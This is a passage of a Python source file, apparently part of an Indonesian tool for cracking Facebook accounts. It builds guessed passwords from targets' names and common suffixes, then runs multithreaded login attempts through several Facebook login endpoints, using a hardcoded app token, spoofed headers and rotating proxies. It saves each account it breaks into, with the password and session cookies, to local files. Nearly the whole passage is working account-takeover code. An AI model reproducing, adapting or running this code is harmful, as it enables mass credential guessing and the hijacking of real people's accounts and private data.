            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")

def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT-FENDI-GANTENG",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","sayangku123","indonesia123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "fankygraph" in method:
                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankytouch,idf,pwv)
                elif "fankybapi" in method:
                	pool.submit(fanky_b_api,idf,pwv)
                else:
                	pool.submit(fanky_b_api,idf,pwv)
 
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fendi ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")

#-------------------[ CRACK-MAIN ]------------#
def fankygraphv1(idf, pwv, url):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FENDI GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
            post = requests.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)

            if "User must verify their account" in post.text:
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break

            elif "session_key" in post.text and "EAA" in post.text:
                ok += 1
                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break

            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
                prog.advance(des)
                time.sleep(10)

            else:
                continue

        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1


#-------------------[ CRACK-MAIN ]------------#
def fankywww(idf, pwv):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FENDI TOUCH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    # ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get(f'https://touch.alpha.facebook.com/login.php?')
            head = {
                'authority': 'touch.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '1.600000023841858',
                'origin': 'https://touch.alpha.facebook.com',
                'referer': 'https://touch.alpha.facebook.com/',
                'accept-encoding': 'br, gzip',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'viewport-width': '980'
            }
            data = {
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
                'email': idf,
                'pass': pw,
                'next': ''
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

#-------------------[ CRACK-MAIN ]------------#
def fanky_b_api(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    # ua = random.choice(ugen)
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FENDI IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "prefill_contact_point": idf,
                "prefill_source": "provided_or_soft_matched",
                "prefill_type": "contact_point",
                "first_prefill_source": "provided_or_soft_matched",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": "true",
                "had_password_prefilled": "false",
                "is_smart_lock": "false",
                "_fb_noscript": "true",
                "email": idf,
                "pass": pw
            }
            head = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": "https://iphone.facebook.com/",
                "Origin": "https://iphone.facebook.com",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "DNT": "1"
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1
#-------------------[ CRACK-MAIN ]------------#
def fankytouch(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	ses = requests.Session()
	prog.update(des, description=f" {K2}•{H2} FENDI MTOUCH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			getfan = "https://mtouch.facebook.com/login.php"
			requ = ses.get(getfan)
			koki = (";").join([ "%s=%s" % (key, value) for key, value in requ.cookies.get_dict().items() ])
			headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive", "Referer": "https://mtouch.facebook.com/", "Origin": "https://mtouch.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1", "TE": "trailers", "X-Requested-With": "com.facebook.katana"}
			data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "try_number": "0", "unrecognized_tries": "0", "email": idf, "pass": pw, "encpass": f"#PWD_BROWSER:0:{int(time.time())}:{pw}", "prefill_contact_point": idf, "prefill_source": "browser_dropdown", "prefill_type": "password_autofill", "first_prefill_source": "browser_dropdown", "first_prefill_type": "password_autofill", "had_cp_prefilled": "true", "had_password_prefilled": "true", "is_smart_lock": "true", "bi_xrwh": "0", "_fb_noscript": "true", "source": "login", "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwMzEsImMiOjI0fQ==", "timezone": "-420", "lgndim": "2560,1440,2", "guid": str(uuid.uuid4()), "login_source": "login", "meta_inf_fbmeta": "", "skip_api_login": "1", "api_key": "882a8490361da98702bf97a021ddc14d", "signed_next": "1", "next": "https://mtouch.facebook.com/", "fb_dtsg": "", "checked_login": "true", "ab_test_data": "", "login_attempt": "1", "sso_device": "mobile", "sso_version": "2.0"}
			fankyurl = "https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9"
			po = ses.post(fankyurl, headers=headers, cookies={'cookie': koki}, data=data)
			if "checkpoint" in ses.cookies.get_dict().keys():
				cp += 1
				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok += 1
				coki = ses.cookies.get_dict()
				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        os.system("clear")
    except:
        pass
    login()
    
